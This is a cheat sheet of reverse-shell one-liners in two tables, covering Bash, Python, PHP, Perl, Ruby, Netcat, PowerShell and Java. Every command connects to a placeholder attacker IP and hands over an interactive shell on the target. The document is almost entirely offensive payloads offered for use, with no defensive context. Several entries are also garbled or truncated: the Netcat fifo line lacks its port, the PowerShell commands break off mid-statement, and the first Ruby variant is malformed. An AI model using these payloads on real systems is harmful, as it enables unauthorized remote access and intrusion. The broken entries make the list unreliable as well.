| **Language/Tool** | **Reverse Shell Command** | **Notes** |
| --- | --- | --- |
| **Bash** | `bash -i >& /dev/tcp/<attacker_IP>/<port> 0>&1` | Simple Bash reverse shell. |
| **Python** | `python -c 'import socket,os,pty; s=socket.socket(); s.connect(("<attacker_IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'` | Requires Python on the target system. |
| **Python3** | `python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker_IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'` | Updated for Python3 syntax. |
| **PHP** | `php -r '$sock=fsockopen("<attacker_IP>",<port>); exec("/bin/sh -i <&3 >&3 2>&3");'` | Requires PHP installed on the target. |
| **Perl** | `perl -e 'use Socket; $i="<attacker_IP>"; $p=<port>; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($p,inet_aton($i))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");'` | Works with systems that have Perl installed. |
| **Ruby** | `ruby -rsocket -e 'exit if fork; s=TCPSocket.new("<attacker_IP>",<port>); loop { c=TCPSocket.new("<attacker_IP>",<port>); IO.copy_stream(c, s); IO.copy_stream(s, c) }'` | Requires Ruby installed on the target. |
| **Netcat** | `nc -e /bin/bash <attacker_IP> <port>` | Works if Netcat supports the `-e` flag. |
| **Netcat (Without -e)** | `mkfifo /tmp/f; nc <attacker_IP>  < /tmp/f | /bin/bash > /tmp/f` |
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<attacker_IP>",);$stream = $client.GetStream();[byte[]]$bytes = 0..65535 | %{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
| **Java** | `java -cp . ReverseShell <attacker_IP> <port>`  *(Java Code Required)* | Requires a compiled Java program for reverse shell (code can be written in a file and compiled). |

---

### **One-Liner Reverse Shells**

| **Language/Tool** | **One-Liner Reverse Shell Command** |
| --- | --- |
| **Bash** | `bash -i >& /dev/tcp/<attacker_IP>/<port> 0>&1` |
| **Python** | `python -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker_IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'` |
| **PHP** | `php -r '$sock=fsockopen("<attacker_IP>",<port>); exec("/bin/sh -i <&3 >&3 2>&3");'` |
| **Perl** | `perl -e 'use Socket; $i="<attacker_IP>"; $p=<port>; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($p,inet_aton($i))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");'` |
| **Ruby** | `ruby -rsocket -e 'exit if fork; s=TCPSocket.new("<attacker_IP>",<port>); exec "/bin/sh -i"'` |
| **Netcat** | `nc -e /bin/bash <attacker_IP> <port>` |
| **Netcat (Without -e)** | `mkfifo /tmp/f; nc <attacker_IP>  < /tmp/f |
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<attacker_IP>",<port>);` |

---
